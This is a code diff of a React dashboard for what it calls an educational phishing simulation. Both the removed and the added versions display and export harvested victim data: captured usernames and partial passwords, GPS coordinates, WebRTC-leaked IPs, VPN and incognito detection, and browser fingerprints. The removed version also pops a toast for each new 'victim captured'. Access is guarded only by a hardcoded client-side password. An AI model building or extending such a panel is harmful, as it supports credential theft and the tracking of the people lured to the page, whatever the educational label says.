@@ -1,463 +1,331 @@
-import { useState, useEffect, useRef } from 'react';
+import { useState, useEffect } from 'react';
+import { useNavigate } from 'react-router-dom';
+import StatsCard from '../components/StatsCard';
+import VictimTable from '../components/VictimTable';
+import LocationChart from '../components/Charts/LocationChart';
+import TimelineChart from '../components/Charts/TimelineChart';
+import DeviceChart from '../components/Charts/DeviceChart';
+import { fetchStats, fetchVictims, clearDatabase, exportToCSV, downloadCSV } from '../utils/api';
 
 /**
- * Dashboard Component - APEX Style
+ * Dashboard Component
  *
- * Dark themed analytics dashboard for phishing simulation data
- * Features: Stats cards, charts, detailed victim table with expandable rows
+ * Analytics dashboard for phishing simulation data
+ * Protected with simple password authentication
  */
 const Dashboard = () => {
-  const [victimsData, setVictimsData] = useState([]);
-  const [lastDataHash, setLastDataHash] = useState('');
-  const [previousVictimCount, setPreviousVictimCount] = useState(0);
-  const [newVictimIds, setNewVictimIds] = useState(new Set());
-  const [expandedRows, setExpandedRows] = useState(new Set());
+  const navigate = useNavigate();
 
-  // Stats state
-  const [stats, setStats] = useState({
-    totalVictims: 0,
-    uniqueCountries: 0,
-    gpsLocations: 0,
-    vpnCount: 0,
-    botCount: 0,
-    incognitoCount: 0,
-    lastCapture: '-'
-  });
+  // Auth state
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [password, setPassword] = useState('');
+  const [authError, setAuthError] = useState('');
 
-  // Toast notification
-  const showToast = (message) => {
-    const toast = document.createElement('div');
-    toast.className = 'toast-notification';
-    toast.textContent = message;
-    document.body.appendChild(toast);
+  // Data state
+  const [stats, setStats] = useState(null);
+  const [victims, setVictims] = useState([]);
+  const [pagination, setPagination] = useState(null);
+  const [currentPage, setCurrentPage] = useState(1);
 
-    setTimeout(() => {
-      toast.style.animation = 'slideOut 0.3s ease-out';
-      setTimeout(() => document.body.removeChild(toast), 300);
-    }, 3000);
-  };
+  // UI state
+  const [isLoading, setIsLoading] = useState(false);
+  const [autoRefresh, setAutoRefresh] = useState(true);
+  const [lastUpdate, setLastUpdate] = useState(new Date());
 
-  // Load data
-  const loadData = async () => {
-    try {
-      const response = await fetch('/api/victims');
-      const newData = await response.json();
+  // Handle authentication
+  const handleAuth = (e) => {
+    e.preventDefault();
+    const correctPassword = 'admin2024'; // In production, this should be env variable
 
-      const newHash = JSON.stringify(newData);
-
-      if (newHash !== lastDataHash) {
-        const currentCount = newData.victims?.length || 0;
-
-        if (previousVictimCount > 0 && currentCount > previousVictimCount) {
-          const latest = newData.victims[newData.victims.length - 1];
-          const location = `${latest.network?.city || 'Unknown'}, ${latest.network?.country || 'Unknown'}`;
-          showToast(`Nuevo víctima capturado! (${location})`);
-
-          const newIds = new Set();
-          for (let i = previousVictimCount; i < currentCount; i++) {
-            newIds.add(`victim-${currentCount - i}`);
-          }
-          setNewVictimIds(newIds);
-        }
-
-        setPreviousVictimCount(currentCount);
-        setVictimsData(newData.victims || []);
-        setLastDataHash(newHash);
-        updateStats(newData.victims || []);
-      } else {
-        updateStats(victimsData);
-      }
-    } catch (error) {
-      console.error('Error loading data:', error);
-    }
-  };
-
-  // Update stats
-  const updateStats = (data) => {
-    const uniqueCountries = [...new Set(data.map(v => v.network?.country || 'Unknown'))].length;
-    const gpsCount = data.filter(v => v.geolocation?.latitude).length;
-    const vpnCount = data.filter(v => v.network?.vpnDetection?.likelyVPN).length;
-    const botCount = data.filter(v => v.device?.isBot).length;
-    const incognitoCount = data.filter(v => v.incognitoMode?.isIncognito).length;
-
-    let lastCapture = '-';
-    if (data.length > 0) {
-      const last = data[data.length - 1];
-      lastCapture = getTimeAgo(new Date(last.timestamp));
-    }
-
-    setStats({
-      totalVictims: data.length,
-      uniqueCountries,
-      gpsLocations: gpsCount,
-      vpnCount,
-      botCount,
-      incognitoCount,
-      lastCapture
-    });
-  };
-
-  // Time ago helper
-  const getTimeAgo = (date) => {
-    const seconds = Math.floor((new Date() - date) / 1000);
-    if (seconds < 60) return `Hace ${seconds} seg`;
-    if (seconds < 3600) return `Hace ${Math.floor(seconds / 60)} min`;
-    if (seconds < 86400) return `Hace ${Math.floor(seconds / 3600)} hrs`;
-    return `Hace ${Math.floor(seconds / 86400)} días`;
-  };
-
-  // Toggle row details
-  const toggleDetails = (victimId) => {
-    const newExpanded = new Set(expandedRows);
-    if (newExpanded.has(victimId)) {
-      newExpanded.delete(victimId);
+    if (password === correctPassword) {
+      setIsAuthenticated(true);
+      setAuthError('');
+      loadDashboardData();
     } else {
-      newExpanded.add(victimId);
-    }
-    setExpandedRows(newExpanded);
-  };
-
-  // Clear data
-  const clearData = async () => {
-    if (confirm('¿Seguro que quieres eliminar TODOS los datos?')) {
-      try {
-        const password = prompt('Ingresa la contraseña del dashboard:');
-        await fetch('/api/clear', {
-          method: 'DELETE',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ password })
-        });
-        alert('Datos eliminados');
-        loadData();
-      } catch (error) {
-        alert('Error al eliminar datos');
-      }
+      setAuthError('Invalid password');
     }
   };
 
-  // Export JSON
-  const exportData = () => {
+  // Load dashboard data
+  const loadDashboardData = async () => {
+    setIsLoading(true);
     try {
-      const dataStr = JSON.stringify(victimsData, null, 2);
-      const dataBlob = new Blob([dataStr], { type: 'application/json' });
-      const url = URL.createObjectURL(dataBlob);
-      const link = document.createElement('a');
-      link.href = url;
-      link.download = `victims_${new Date().toISOString()}.json`;
-      link.click();
-      URL.revokeObjectURL(url);
+      const [statsData, victimsData] = await Promise.all([
+        fetchStats(),
+        fetchVictims(currentPage, 20),
+      ]);
+
+      setStats(statsData);
+      setVictims(victimsData.victims);
+      setPagination(victimsData.pagination);
+      setLastUpdate(new Date());
     } catch (error) {
-      alert('Error al exportar');
+      console.error('Error loading dashboard data:', error);
+      alert('Error loading data. Please check your connection to MongoDB.');
+    } finally {
+      setIsLoading(false);
     }
   };
 
-  // Export CSV
-  const exportCSV = () => {
+  // Handle page change
+  const handlePageChange = async (newPage) => {
+    setCurrentPage(newPage);
+    setIsLoading(true);
+
     try {
-      let csv = 'Timestamp,Username,IP,Country,City,Latitude,Longitude,Device,OS,Browser\n';
-      victimsData.forEach(v => {
-        const lat = v.geolocation?.latitude || '';
-        const lon = v.geolocation?.longitude || '';
-        csv += `"${v.timestamp}","${v.metadata?.formData?.username || 'N/A'}","${v.network?.ip || ''}","${v.network?.country || ''}","${v.network?.city || ''}","${lat}","${lon}","${v.device?.type || ''}","${v.os?.name || ''}","${v.browser?.name || ''}"\n`;
-      });
-
-      const blob = new Blob([csv], { type: 'text/csv' });
-      const url = URL.createObjectURL(blob);
-      const link = document.createElement('a');
-      link.href = url;
-      link.download = `victims_${new Date().toISOString()}.csv`;
-      link.click();
-      URL.revokeObjectURL(url);
+      const victimsData = await fetchVictims(newPage, 20);
+      setVictims(victimsData.victims);
+      setPagination(victimsData.pagination);
     } catch (error) {
-      alert('Error al exportar CSV');
+      console.error('Error loading page:', error);
+    } finally {
+      setIsLoading(false);
     }
   };
 
-  // Initial load and auto-refresh
+  // Export to CSV
+  const handleExport = async () => {
+    try {
+      // Fetch all victims for export
+      const allVictimsData = await fetchVictims(1, 10000);
+      const csvContent = exportToCSV(allVictimsData.victims);
+      downloadCSV(csvContent, `victims-export-${Date.now()}.csv`);
+    } catch (error) {
+      console.error('Error exporting data:', error);
+      alert('Error exporting data');
+    }
+  };
+
+  // Clear database
+  const handleClearDatabase = async () => {
+    const confirmed = window.confirm(
+      '⚠️ WARNING: This will permanently delete ALL victim data.\n\nThis action cannot be undone.\n\nAre you sure you want to continue?'
+    );
+
+    if (!confirmed) return;
+
+    const doubleConfirm = window.confirm(
+      'Final confirmation: Type the password again in the next prompt to confirm deletion.'
+    );
+
+    if (!doubleConfirm) return;
+
+    const confirmPassword = window.prompt('Enter dashboard password to confirm:');
+
+    if (confirmPassword !== 'admin2024') {
+      alert('Invalid password. Database not cleared.');
+      return;
+    }
+
+    try {
+      await clearDatabase(confirmPassword);
+      alert('✅ Database cleared successfully');
+      loadDashboardData(); // Reload empty data
+    } catch (error) {
+      console.error('Error clearing database:', error);
+      alert('Error clearing database');
+    }
+  };
+
+  // Auto-refresh effect
   useEffect(() => {
-    loadData();
-    const interval = setInterval(loadData, 5000);
-    return () => clearInterval(interval);
-  }, []);
+    if (isAuthenticated && autoRefresh) {
+      const interval = setInterval(() => {
+        loadDashboardData();
+      }, 30000); // Refresh every 30 seconds
 
-  return (
-    <div className="min-h-screen bg-[#0a0e27] text-[#e0e0e0] p-5">
-      <style>{`
-        .apex-gradient {
-          background: linear-gradient(135deg, #00ff88, #00d4ff);
-          -webkit-background-clip: text;
-          background-clip: text;
-          -webkit-text-fill-color: transparent;
-        }
+      return () => clearInterval(interval);
+    }
+  }, [isAuthenticated, autoRefresh, currentPage]);
 
-        .apex-card {
-          background: linear-gradient(135deg, #1a1f3a 0%, #2d1b3d 100%);
-          border: 1px solid rgba(0, 255, 136, 0.27);
-          transition: all 0.3s;
-        }
+  // Render authentication screen
+  if (!isAuthenticated) {
+    return (
+      <div className="min-h-screen bg-apex-dark flex items-center justify-center p-4">
+        <div className="apex-card max-w-md w-full">
+          <div className="text-center mb-6">
+            <div className="text-5xl mb-4">🔒</div>
+            <h1 className="text-3xl font-bold text-apex-red mb-2">Dashboard Access</h1>
+            <p className="text-gray-400">Enter password to view analytics</p>
+          </div>
 
-        .apex-card:hover {
-          border-color: #00ff88;
-          box-shadow: 0 8px 25px rgba(0, 255, 136, 0.3);
-        }
-
-        .apex-button {
-          background: linear-gradient(135deg, #00ff88, #00d4ff);
-          color: #0a0e27;
-          font-weight: bold;
-          box-shadow: 0 4px 15px rgba(0, 255, 136, 0.3);
-          transition: all 0.3s;
-        }
-
-        .apex-button:hover {
-          transform: translateY(-2px);
-          box-shadow: 0 6px 20px rgba(0, 255, 136, 0.5);
-        }
-
-        .apex-button.danger {
-          background: linear-gradient(135deg, #ff3333, #ff6b6b);
-        }
-
-        .apex-button.secondary {
-          background: linear-gradient(135deg, #667eea, #764ba2);
-        }
-
-        .toast-notification {
-          position: fixed;
-          top: 20px;
-          right: 20px;
-          background: linear-gradient(135deg, #00ff88, #00d4ff);
-          color: #0a0e27;
-          padding: 15px 20px;
-          border-radius: 8px;
-          box-shadow: 0 4px 15px rgba(0, 255, 136, 0.3);
-          font-weight: bold;
-          z-index: 10000;
-          animation: slideIn 0.3s ease-out;
-          min-width: 250px;
-        }
-
-        @keyframes slideIn {
-          from { transform: translateX(400px); opacity: 0; }
-          to { transform: translateX(0); opacity: 1; }
-        }
-
-        @keyframes slideOut {
-          from { transform: translateX(0); opacity: 1; }
-          to { transform: translateX(400px); opacity: 0; }
-        }
-
-        @keyframes victimPulse {
-          0%, 100% { background: #13182e; }
-          50% { background: rgba(0, 255, 136, 0.27); box-shadow: 0 0 20px rgba(0, 255, 136, 0.3); }
-        }
-
-        .new-victim-highlight {
-          animation: victimPulse 2s ease-out;
-        }
-
-        .badge {
-          display: inline-block;
-          padding: 3px 8px;
-          border-radius: 4px;
-          font-size: 11px;
-          font-weight: bold;
-          margin-left: 5px;
-        }
-      `}</style>
-
-      {/* Header */}
-      <div className="text-center mb-8 p-8 rounded-2xl border-2 border-[#00ff88] shadow-[0_0_30px_rgba(0,255,136,0.2)]" style={{background: 'linear-gradient(135deg, #1a1f3a 0%, #2d1b3d 100%)'}}>
-        <h1 className="text-5xl font-bold mb-3 apex-gradient">CIBERSEGURIDAD DASHBOARD</h1>
-        <p className="text-gray-500">Sistema de Análisis de Seguridad - Proyecto Educativo</p>
-      </div>
-
-      {/* Controls */}
-      <div className="flex gap-3 flex-wrap justify-center mb-6">
-        <button onClick={loadData} className="apex-button px-7 py-3.5 rounded-lg">Actualizar</button>
-        <button onClick={clearData} className="apex-button danger px-7 py-3.5 rounded-lg">Limpiar Datos</button>
-        <button onClick={exportData} className="apex-button secondary px-7 py-3.5 rounded-lg">Exportar JSON</button>
-        <button onClick={exportCSV} className="apex-button secondary px-7 py-3.5 rounded-lg">Exportar CSV</button>
-      </div>
-
-      {/* Stats Cards */}
-      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 xl:grid-cols-7 gap-5 mb-8">
-        {[
-          { label: 'Víctimas Totales', value: stats.totalVictims },
-          { label: 'Países Únicos', value: stats.uniqueCountries },
-          { label: 'Ubicaciones GPS', value: stats.gpsLocations },
-          { label: 'VPNs Detectadas', value: stats.vpnCount },
-          { label: 'Bots Detectados', value: stats.botCount },
-          { label: 'Modo Incógnito', value: stats.incognitoCount },
-          { label: 'Última Captura', value: stats.lastCapture, small: true }
-        ].map((stat, i) => (
-          <div key={i} className="apex-card p-6 rounded-xl text-center hover:-translate-y-1">
-            <h3 className="text-xs text-[#00ff88] mb-4 uppercase">{stat.label}</h3>
-            <div className={`${stat.small ? 'text-base' : 'text-4xl'} font-bold apex-gradient`}>
-              {stat.value}
+          <form onSubmit={handleAuth} className="space-y-4">
+            <div>
+              <label className="block text-sm font-medium mb-2 text-gray-300">Password</label>
+              <input
+                type="password"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                className="apex-input"
+                placeholder="Enter dashboard password"
+                autoFocus
+              />
+              {authError && <p className="mt-2 text-sm text-red-500">{authError}</p>}
             </div>
+
+            <button type="submit" className="apex-button w-full">
+              Access Dashboard
+            </button>
+          </form>
+
+          <div className="mt-6 text-center">
+            <button
+              onClick={() => navigate('/')}
+              className="text-sm text-gray-500 hover:text-apex-green transition-colors"
+            >
+              ← Back to simulation
+            </button>
           </div>
-        ))}
-      </div>
 
-      {/* Victims Table */}
-      <div className="bg-[#1a1f3a] p-6 rounded-xl border border-[#00ff88] overflow-x-auto">
-        <h2 className="text-3xl mb-5 text-[#00ff88]">Registro de Víctimas</h2>
-
-        {victimsData.length === 0 ? (
-          <div className="text-center py-16 text-gray-500 text-xl">
-            <div className="inline-block w-12 h-12 border-4 border-[rgba(0,255,136,0.3)] border-t-[#00ff88] rounded-full animate-spin mb-5"></div>
-            <p>Cargando datos...</p>
+          <div className="mt-6 text-xs text-center text-gray-600">
+            <p>🎓 Educational Project - Ciberseguridad del Bienestar</p>
           </div>
-        ) : (
-          <table className="w-full text-sm border-collapse">
-            <thead>
-              <tr className="bg-[#0a0e27]">
-                {['#', 'Usuario', 'IP', 'Ubicación', 'Coordenadas', 'Dispositivo', 'Navegador', 'Fecha'].map(h => (
-                  <th key={h} className="text-left p-3.5 text-[#00ff88] font-bold uppercase text-xs border-b border-gray-700">{h}</th>
-                ))}
-              </tr>
-            </thead>
-            <tbody>
-              {[...victimsData].reverse().map((victim, index) => {
-                const victimId = `victim-${victimsData.length - index}`;
-                const isExpanded = expandedRows.has(victimId);
-                const isNew = newVictimIds.has(victimId);
-
-                // Location badge
-                const locationSource = victim.network?.locationSource;
-                let locationBadge = '';
-                if (locationSource === 'gps') locationBadge = '🟢';
-                else if (locationSource === 'ipapi') locationBadge = '🔴';
-                else if (victim.network?.fromCache) locationBadge = '🟠';
-                else locationBadge = '🔴';
-
-                // Coordinates
-                const hasGPS = victim.geolocation?.latitude && victim.geolocation?.longitude;
-                const coords = hasGPS ?
-                  `${victim.geolocation.latitude.toFixed(4)}, ${victim.geolocation.longitude.toFixed(4)}` :
-                  'N/A';
-
-                // IP with WebRTC
-                let ipDisplay = victim.network?.ip || 'Unknown';
-                if (victim.webRTC?.publicIP && victim.webRTC.publicIP !== victim.network?.ip) {
-                  ipDisplay += ` / ${victim.webRTC.publicIP}`;
-                }
-
-                return (
-                  <>
-                    <tr
-                      key={victimId}
-                      onClick={() => toggleDetails(victimId)}
-                      className={`cursor-pointer border-b border-gray-700 hover:bg-[#2a2f4a] ${isNew ? 'new-victim-highlight' : ''}`}
-                    >
-                      <td className="p-3.5">{victimsData.length - index}</td>
-                      <td className="p-3.5">
-                        <strong>{victim.metadata?.formData?.username || 'Visitor'}</strong>
-                      </td>
-                      <td className="p-3.5">{ipDisplay}</td>
-                      <td className="p-3.5">
-                        {locationBadge} {victim.network?.city || 'Unknown'}, {victim.network?.country || 'Unknown'}
-                        {victim.network?.vpnDetection?.likelyVPN && <span className="badge bg-red-500/30 text-red-400">VPN</span>}
-                      </td>
-                      <td className="p-3.5">
-                        {hasGPS ? (
-                          <a href={`https://www.google.com/maps?q=${coords}`} target="_blank" className="text-[#00d4ff] hover:underline">{coords}</a>
-                        ) : coords}
-                      </td>
-                      <td className="p-3.5">
-                        {victim.device?.type || 'Unknown'} - {victim.os?.name || 'Unknown'}
-                        {victim.device?.isBot && <span className="badge bg-purple-500/30 text-purple-400">BOT</span>}
-                      </td>
-                      <td className="p-3.5">
-                        {victim.browser?.name || 'Unknown'} {victim.browser?.version || ''}
-                        {victim.incognitoMode?.isIncognito && <span className="badge bg-purple-500/30 text-purple-400">INCOGNITO</span>}
-                      </td>
-                      <td className="p-3.5">{new Date(victim.timestamp).toLocaleString('es-MX')}</td>
-                    </tr>
-
-                    {/* Expanded Details Row */}
-                    {isExpanded && (
-                      <tr className="bg-[#0a0e27]">
-                        <td colSpan="8" className="p-5 border-l-4 border-[#00ff88]">
-                          <VictimDetails victim={victim} />
-                        </td>
-                      </tr>
-                    )}
-                  </>
-                );
-              })}
-            </tbody>
-          </table>
-        )}
-      </div>
-    </div>
-  );
-};
-
-// Victim Details Component
-const VictimDetails = ({ victim }) => {
-  const DetailSection = ({ title, children }) => (
-    <div className="mb-4">
-      <h4 className="text-[#00ff88] mb-2 text-sm font-bold">{title}</h4>
-      {children}
-    </div>
-  );
-
-  const DetailGrid = ({ items }) => (
-    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-2.5 text-xs">
-      {items.map((item, i) => (
-        <div key={i} className="bg-[#1a1f3a] p-2 rounded">
-          <div className="text-gray-500 text-[10px] uppercase">{item.label}</div>
-          <div className="text-[#e0e0e0] mt-1">{item.value}</div>
         </div>
-      ))}
-    </div>
-  );
+      </div>
+    );
+  }
 
+  // Render loading state
+  if (!stats) {
+    return (
+      <div className="min-h-screen bg-apex-dark flex items-center justify-center">
+        <div className="text-center">
+          <div className="inline-block animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-apex-red mb-4"></div>
+          <p className="text-xl text-apex-green">Loading dashboard...</p>
+        </div>
+      </div>
+    );
+  }
+
+  // Render dashboard
   return (
-    <div className="space-y-4">
-      {/* Credentials */}
-      {victim.metadata?.formData?.password && (
-        <DetailSection title="Credenciales Capturadas">
-          <DetailGrid items={[
-            { label: 'Usuario', value: victim.metadata.formData.username || 'N/A' },
-            { label: 'Contraseña', value: '••••••••' + (victim.metadata.formData.password?.slice(-4) || '') }
-          ]} />
-        </DetailSection>
-      )}
+    <div className="min-h-screen bg-gradient-to-br from-apex-dark via-gray-900 to-black p-4 sm:p-6 lg:p-8">
+      {/* Header */}
+      <div className="container mx-auto mb-8">
+        <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
+          <div>
+            <h1 className="text-4xl font-bold mb-2">
+              <span className="text-apex-red">Phishing</span>{' '}
+              <span className="text-white">Analytics</span>
+            </h1>
+            <p className="text-gray-400">
+              Last updated: {lastUpdate.toLocaleTimeString()}
+            </p>
+          </div>
 
-      {/* VPN Detection */}
-      {victim.network?.vpnDetection && (
-        <DetailSection title="Detección de VPN/Proxy">
-          <DetailGrid items={[
-            { label: 'Probable VPN', value: victim.network.vpnDetection.likelyVPN ? 'SÍ' : 'NO' },
-            { label: 'Confianza', value: (victim.network.vpnDetection.confidence || 'low').toUpperCase() },
-            { label: 'Timezone Mismatch', value: victim.network.vpnDetection.timezoneMismatch ? 'Sí' : 'No' },
-            { label: 'WebRTC Leak', value: victim.network.vpnDetection.webRTCLeak ? 'Sí' : 'No' }
-          ]} />
-        </DetailSection>
-      )}
+          <div className="flex flex-wrap gap-2">
+            <button
+              onClick={() => setAutoRefresh(!autoRefresh)}
+              className={`px-4 py-2 rounded-lg border-2 transition-colors ${
+                autoRefresh
+                  ? 'bg-apex-green/20 border-apex-green text-apex-green'
+                  : 'bg-gray-800 border-gray-600 text-gray-400'
+              }`}
+            >
+              {autoRefresh ? '✓ Auto-refresh' : 'Auto-refresh off'}
+            </button>
+            <button
+              onClick={loadDashboardData}
+              disabled={isLoading}
+              className="px-4 py-2 bg-apex-darker border-2 border-apex-red/30 rounded-lg hover:border-apex-red transition-colors disabled:opacity-50"
+            >
+              {isLoading ? 'Refreshing...' : '🔄 Refresh'}
+            </button>
+            <button
+              onClick={handleClearDatabase}
+              className="px-4 py-2 bg-red-900/30 border-2 border-red-600 text-red-400 rounded-lg hover:bg-red-900/50 transition-colors"
+            >
+              🗑️ Clear DB
+            </button>
+            <button
+              onClick={() => navigate('/')}
+              className="px-4 py-2 bg-apex-darker border-2 border-apex-gold/30 rounded-lg hover:border-apex-gold transition-colors"
+            >
+              ← Back to Simulation
+            </button>
+          </div>
+        </div>
+      </div>
 
-      {/* Device & Hardware */}
-      <DetailSection title="Dispositivo & Hardware">
-        <DetailGrid items={[
-          { label: 'Tipo', value: victim.device?.type || 'Unknown' },
-          { label: 'CPU Cores', value: victim.device?.cpuCores || 'N/A' },
-          { label: 'Memoria', value: victim.device?.memory || 'N/A' },
-          { label: 'Bot', value: victim.device?.isBot ? 'Sí' : 'No' }
-        ]} />
-      </DetailSection>
+      <div className="container mx-auto space-y-8">
+        {/* Stats Cards */}
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+          <StatsCard
+            title="Total Victims"
+            value={stats.totalVictims}
+            icon="👥"
+            color="text-apex-red"
+          />
+          <StatsCard
+            title="Success Rate"
+            value={`${stats.successRate}%`}
+            icon="🎯"
+            color="text-apex-gold"
+          />
+          <StatsCard
+            title="Avg Time (sec)"
+            value={stats.averageTime}
+            icon="⏱️"
+            color="text-apex-green"
+          />
+          <StatsCard
+            title="Unique Locations"
+            value={stats.uniqueLocations}
+            icon="🌍"
+            color="text-purple-400"
+          />
+        </div>
 
-      {/* Fingerprints */}
-      {victim.fingerprints && (
-        <DetailSection title="Fingerprints">
-          <DetailGrid items={[
-            { label: 'Canvas', value: (victim.fingerprints.canvas || 'N/A').substring(0, 20) + '...' },
-            { label: 'WebGL', value: victim.fingerprints.webgl?.renderer || 'N/A' }
-          ]} />
-        </DetailSection>
-      )}
+        {/* Additional Stats */}
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
+          <StatsCard
+            title="VPN Users"
+            value={stats.vpnUsers}
+            icon="🔐"
+            color="text-yellow-500"
+          />
+          <StatsCard
+            title="Mobile Devices"
+            value={stats.deviceBreakdown.mobile}
+            icon="📱"
+            color="text-blue-400"
+          />
+          <StatsCard
+            title="Desktop Devices"
+            value={stats.deviceBreakdown.desktop}
+            icon="💻"
+            color="text-cyan-400"
+          />
+        </div>
+
+        {/* Charts */}
+        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+          <TimelineChart data={stats.hourlyData} />
+          <DeviceChart data={stats.deviceBreakdown} />
+        </div>
+
+        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+          <LocationChart data={stats.topCountries} title="Top Countries" />
+          <LocationChart data={stats.topCities} title="Top Cities" />
+        </div>
+
+        {/* Victims Table */}
+        <VictimTable
+          victims={victims}
+          pagination={pagination}
+          onPageChange={handlePageChange}
+          onExport={handleExport}
+        />
+
+        {/* Footer */}
+        <div className="text-center py-8 text-gray-600 text-sm">
+          <p>⚠️ Educational Cybersecurity Project</p>
+          <p className="mt-2">
+            This dashboard displays data collected from a phishing awareness simulation.
+          </p>
+          <p className="mt-1">All data is used for educational purposes only.</p>
+        </div>
+      </div>
     </div>
   );
 };
